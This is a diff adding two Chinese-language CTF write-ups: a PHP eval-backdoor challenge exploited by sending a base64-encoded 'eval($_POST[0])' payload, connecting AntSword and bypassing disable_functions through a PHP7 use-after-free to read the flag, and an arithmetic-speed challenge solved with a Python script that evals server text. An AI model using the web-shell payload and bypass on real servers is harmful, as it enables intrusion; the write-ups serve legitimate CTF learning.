@@ -370,29 +370,247 @@ NSSCTF{w3lc0m3_t0_nctf2018hhhhhhhhhhhh}
 
 
 
+### [GKCTF 2020]CheckIN
+
+#### 题目介绍
+
+> 1分
+>
+> disable_functions绕过PHPRCE
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> 无描述
+
+---
+
+#### 解题过程
+
+##### 查看源码
+
+```php
+<title>Check_In</title>
+<?php 
+highlight_file(__FILE__);
+class ClassName
+{
+        public $code = null;
+        public $decode = null;
+        function __construct()
+        {
+                $this->code = @$this->x()['Ginkgo'];
+                $this->decode = @base64_decode( $this->code );
+                @Eval($this->decode);
+        }
+
+        public function x()
+        {
+                return $_REQUEST;
+        }
+}
+new ClassName();
+```
+
+**分析**
+
+- 先用`/?Ginkgo=phpinfo();`查看**disable_functions**
+
+  ```shell
+  pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,
+  ```
+
+- 禁了好多，插件到php是php7，考虑PHP7中因为垃圾回收机制造成的UAF漏洞，我们可以用蚁剑的disable_functions插件绕过
+
+##### 连接蚁剑
+
+```shell
+URL: http://node4.anna.nssnode.cn:29553/?Ginkgo=ZXZhbCgkX1BPU1RbMF0pOw==
+密码: 0
+备注: 
+编码: UTF8
+类型: PHP
+编码器: base64
+解码器: base64
+插件: disable_functions
+```
+
+**分析**
+
+- 连接不用使用代理
+- 部分校园网自带代理，如果连接失败可以尝试使用数据流量
+
+```shell
+(www-data:/var/www/html) $ ls /
+bin
+boot
+dev
+etc
+flag
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+```
+
+```shell
+(www-data:/var/www/html) $ /readflag
+NSSCTF{9baf866b-bbf2-448f-9a2a-8685d804ece5}
+```
+
+#### 题目答案
+
+##### Flag
+
+```flag
+NSSCTF{9baf866b-bbf2-448f-9a2a-8685d804ece5}
+```
+
+#### 漏洞成因
+
+PHP7中因为垃圾回收机制造成的UAF漏洞
+
+#### 漏洞修复
+
+更新PHP版本
 
 
 
+### [HUBUCTF 2022 新生赛]Calculate
 
+#### 题目介绍
 
+> 1分
+>
+> PythonWEB脚本编写
+>
+> 
+>
+> 
+>
+> 题目描述
+>
+> python is a good tool in CTF
 
+---
 
+#### 解题过程
 
+##### 1. 查看源码
 
+```html
+<h1>Answer my questions</h1>
 
+<p>Answer the following methematics questions for 20 times;you have 3 seconds to solve each question;</p>
+<p>In order to protect the server you can't ans one question in less than 1 second</p>
+<p> You Have answered 0questions;</p>
 
+<form action="" method="post">
+<div style="display:inline;color:#F3D8A0">8</div><div style="display:inline;color:#F9C9F6">3</div><div style="display:inline;color:#3CE075">3</div><div style="display:inline;color:#56A4F8">-</div><div style="display:inline;color:#AAA58C">1</div><div style="display:inline;color:#C709FA">2</div><div style="display:inline;color:#AE4673">1</div><div style="display:inline;color:#CAFBA6">=</div>
+<input type="text" name="ans">
+<input type="submit" value="send!">
+</form>
+```
 
+**分析**
 
+- 正则匹配**>(.)<**获取题目字符
+- **"".join(map(str,["1","+","1","="])).replace("=",")**拼接字符
+- **eval()**计算答案
 
+##### 2. 查看数据包
 
+```shell
+Request URL> http://node5.anna.nssnode.cn:29968/
+Request method> POST
+...
+ans=test
+```
 
+**分析**
 
+- **POST**
+- 注意请求需要统一**Session**
 
+##### 3. 编写脚本
 
+```python
+import re
+import time
+import requests
+from requests import Response
 
+session = requests.Session()
 
+def postBySession(uri: str, data: dict | None = None,) -> Response: return session.post(url=uri, data=data)
 
+if __name__ == "__main__":
+    url = "http://node5.anna.nssnode.cn:29968/"
+    question = "0"
+    
+    while True:
+        time.sleep(1)
+        response = postBySession(url, {"ans": f"{eval(question)}"}).text
+        if response.__contains__("NSSCTF{") and response.__contains__("}"):
+            print("".join(re.findall(r"NSSCTF\{.*?}", response)))
+            break
+        question = (''.join(map(str, re.findall(r">(.)<", response))).replace("=", ""))
+        print(f"{question} = {eval(question)}")
+```
 
+```shell
+857+532 = 1389
+770-147 = 623
+54+64 = 118
+87*474 = 41238
+588+952+588*952 = 561316
+19*393 = 7467
+468-945 = -477
+452*147 = 66444
+684+741 = 1425
+464*331 = 153584
+633+650 = 1283
+817+272+817*272 = 223313
+235*819 = 192465
+78+717 = 795
+589+1 = 590
+591+498+591*498 = 295407
+217+618+217*618 = 134941
+243+270 = 513
+429+752 = 1181
+184*821 = 151064
+NSSCTF{98c14c96-f13e-4045-9a26-c2821cf115bc}
+```
+
+#### 题目答案
+
+##### 脚本
+
+```python
+脚本如上
+```
+
+##### Flag
+
+```flag
+NSSCTF{98c14c96-f13e-4045-9a26-c2821cf115bc}
+```
 
 
 
